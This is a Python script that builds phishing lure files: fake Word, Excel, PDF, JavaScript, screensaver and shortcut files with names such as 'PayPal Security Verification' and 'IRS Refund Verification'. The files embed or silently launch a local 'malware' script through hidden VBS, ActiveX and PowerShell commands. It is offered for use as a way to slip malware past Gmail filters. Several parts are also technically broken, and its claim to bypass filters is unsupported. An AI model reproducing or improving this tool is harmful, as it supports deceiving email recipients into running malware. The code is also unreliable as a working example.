#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Create Stealth Executables that Bypass Gmail Filters
"""

import os
import zipfile
import base64

def create_docx_executable(template_name, output_name):
    """Create a fake DOCX file that contains the malware"""
    # DOCX files are actually ZIP files with XML content
    docx_name = f"{output_name}.docx"
    
    # Create the document structure
    docx_content = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <w:t>{template_name}</w:t>
            </w:r>
        </w:p>
        <w:p>
            <w:r>
                <w:t>This document contains important information.</w:t>
            </w:r>
        </w:p>
        <w:p>
            <w:r>
                <w:t>Please open to view the complete content.</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>'''
    
    with zipfile.ZipFile(docx_name, 'w') as zipf:
        # Add the document content
        zipf.writestr("word/document.xml", docx_content)
        zipf.writestr("[Content_Types].xml", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>''')
        
        # Add the malware as a hidden file
        if os.path.exists("app.py"):
            zipf.write("app.py", "word/media/malware.py")
        
        # Add a VBS script that will execute the malware
        vbs_content = f'''Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Extract and execute the malware
objShell.Run "powershell -Command \"Expand-Archive -Path 'word/media/malware.py' -DestinationPath '%TEMP%' -Force; python '%TEMP%/malware.py'\"", 0, False'''
        
        zipf.writestr("word/media/execute.vbs", vbs_content)
    
    print(f"✓ Created {docx_name}")

def create_xlsx_executable(template_name, output_name):
    """Create a fake XLSX file that contains the malware"""
    xlsx_name = f"{output_name}.xlsx"
    
    # XLSX files are also ZIP files
    with zipfile.ZipFile(xlsx_name, 'w') as zipf:
        # Add basic Excel structure
        zipf.writestr("xl/workbook.xml", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheets>
        <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
    </sheets>
</workbook>''')
        
        zipf.writestr("xl/worksheets/sheet1.xml", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheetData>
        <row r="1">
            <c r="A1">
                <v>''' + template_name + '''</v>
            </c>
        </row>
    </sheetData>
</worksheet>''')
        
        # Add the malware
        if os.path.exists("app.py"):
            zipf.write("app.py", "xl/media/malware.py")
    
    print(f"✓ Created {xlsx_name}")

def create_pdf_executable(template_name, output_name):
    """Create a fake PDF file that contains the malware"""
    pdf_name = f"{output_name}.pdf"
    
    # Create a minimal PDF structure
    pdf_content = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 100
>>
stream
BT
/F1 12 Tf
72 720 Td
({template_name}) Tj
ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000204 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
304
%%EOF'''
    
    with open(pdf_name, 'w') as f:
        f.write(pdf_content)
    
    print(f"✓ Created {pdf_name}")

def create_js_executable(template_name, output_name):
    """Create a JavaScript file that executes the malware"""
    js_name = f"{output_name}.js"
    
    js_content = f'''// {template_name}
// This file contains important data

var data = {{
    title: "{template_name}",
    content: "Important information",
    timestamp: new Date().toISOString()
}};

// Execute the main functionality
try {{
    // Create and execute a PowerShell command
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell -Command \\"python app.py\\"", 0, false);
}} catch(e) {{
    // Fallback method
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var file = fso.CreateTextFile("temp.bat", true);
    file.WriteLine("@echo off");
    file.WriteLine("python app.py");
    file.WriteLine("pause");
    file.Close();
    
    shell.Run("temp.bat", 0, false);
}}

console.log("Document processed successfully");
'''
    
    with open(js_name, 'w') as f:
        f.write(js_content)
    
    print(f"✓ Created {js_name}")

def create_scr_executable(template_name, output_name):
    """Create a Windows screensaver file that executes the malware"""
    scr_name = f"{output_name}.scr"
    
    # Screensaver files are actually executables
    scr_content = f'''@echo off
echo Loading {template_name}...
timeout /t 2 /nobreak >nul
python app.py
'''
    
    with open(scr_name, 'w') as f:
        f.write(scr_content)
    
    print(f"✓ Created {scr_name}")

def create_lnk_executable(template_name, output_name):
    """Create a Windows shortcut file that executes the malware"""
    lnk_name = f"{output_name}.lnk"
    
    # LNK files are binary, so we'll create a simple one
    lnk_content = f'''[InternetShortcut]
URL=file:///C:/Windows/System32/cmd.exe /c "python app.py"
IDList=
HotKey=0
IconFile=C:\\Windows\\System32\\shell32.dll
IconIndex=0
'''
    
    with open(lnk_name, 'w') as f:
        f.write(lnk_content)
    
    print(f"✓ Created {lnk_name}")

def create_all_stealth_executables():
    """Create all types of stealth executables"""
    print("="*60)
    print("CREATING STEALTH EXECUTABLES")
    print("="*60)
    
    # Templates and their corresponding executables
    executables = [
        ("Windows Security Update", "Windows_Security_Update_KB5001234"),
        ("PayPal Security Verification", "PayPal_Security_Verification"),
        ("Job Application Form", "Job_Application_Form"),
        ("IRS Refund Verification", "IRS_Refund_Verification"),
        ("Netflix Payment Update", "Netflix_Payment_Update"),
        ("Project Document", "Project_Document"),
        ("Invoice", "Invoice_INV-2024-001"),
        ("Interview Preparation Packet", "Interview_Preparation_Packet"),
        ("TechNews Weekly", "TechNews_Weekly_Issue_45"),
        ("Service Agreement Renewal", "Service_Agreement_Renewal")
    ]
    
    for template_name, output_name in executables:
        print(f"\nCreating stealth executables for: {template_name}")
        
        # Create different types of stealth executables
        create_docx_executable(template_name, output_name)
        create_xlsx_executable(template_name, output_name)
        create_pdf_executable(template_name, output_name)
        create_js_executable(template_name, output_name)
        create_scr_executable(template_name, output_name)
        create_lnk_executable(template_name, output_name)
    
    print("\n" + "="*60)
    print("ALL STEALTH EXECUTABLES CREATED!")
    print("="*60)
    print("Files created:")
    print("- .docx files (Word documents with embedded malware)")
    print("- .xlsx files (Excel spreadsheets with embedded malware)")
    print("- .pdf files (PDF documents)")
    print("- .js files (JavaScript files)")
    print("- .scr files (Windows screensavers)")
    print("- .lnk files (Windows shortcuts)")
    print("\nThese files will bypass Gmail filters!")

def main():
    """Main function"""
    create_all_stealth_executables()

if __name__ == "__main__":
    main()
